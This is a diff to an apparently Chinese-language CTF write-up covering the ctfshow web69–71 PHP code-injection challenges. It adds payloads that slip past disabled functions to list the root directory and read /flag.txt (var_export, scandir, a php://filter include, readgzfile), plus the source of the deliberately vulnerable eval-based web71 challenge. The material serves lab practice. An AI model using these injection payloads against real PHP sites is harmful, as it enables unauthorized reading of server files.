@@ -2397,9 +2397,88 @@ c=include('/flag.txt') //赌
 
 
 
-这题print_r() 和 var_dump() 都被禁用
+这题相比上一题，print_r() 和 var_dump() 也被禁用了
 
 我们可以通过寻找其他可以打印数组的函数来打印目录
+
+我们可以通过var_export()来代替，从而打印目录
+
+```
+c=var_export(scandir("/"));
+```
+
+![image-20241129130708792](assets/image-20241129130708792.png)
+
+接下读flag即可
+
+```
+c=include($_POST['w']);&w=php://filter/convert.base64-encode/resource=/flag.txt
+```
+
+
+
+其他的解法：
+
+查文件
+
+```
+?c=echo implode(",",(scandir('/'))); 
+?c=echo json_encode(scandir("/"));
+```
+
+读文件
+
+```
+?c=readgzfile('/flag.txt');
+```
+
+
+
+#### web70
+
+![image-20241129132128259](assets/image-20241129132128259.png)
+
+这题把error_reporting()和ini_set()禁用了
+
+虽然不知道有什么用，不影响我用上一题的方法读flag
+
+#### web71
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set('display_errors', 0);
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+
+你要上天吗？
+```
+
+
+
+
 
 
 
